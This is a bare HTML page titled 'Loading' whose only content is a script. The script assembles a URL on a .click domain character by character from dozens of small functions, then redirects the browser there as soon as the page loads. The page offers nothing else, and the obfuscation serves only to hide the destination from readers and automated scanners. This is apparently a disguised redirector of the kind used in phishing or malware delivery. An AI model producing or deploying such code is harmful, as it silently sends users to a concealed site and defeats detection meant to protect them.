<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            () => 't',
            () => 't',
            _ => 'p',
            function() { return 's'; },
            function() { return ':'; },
            _ => '/',
            function() { return '/'; },
            function() { return 'v'; },
            () => 'e',
            () => 'r',
            _ => 'g',
            function() { return 'e'; },
            function() { return 'n'; },
            () => '.',
            _ => 'c',
            function() { return 'l'; },
            function() { return 'i'; },
            _ => 'c',
            () => 'k',
            _ => '/',
            _ => 's',
            _ => '/',
            () => 'n',
            () => 'e',
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
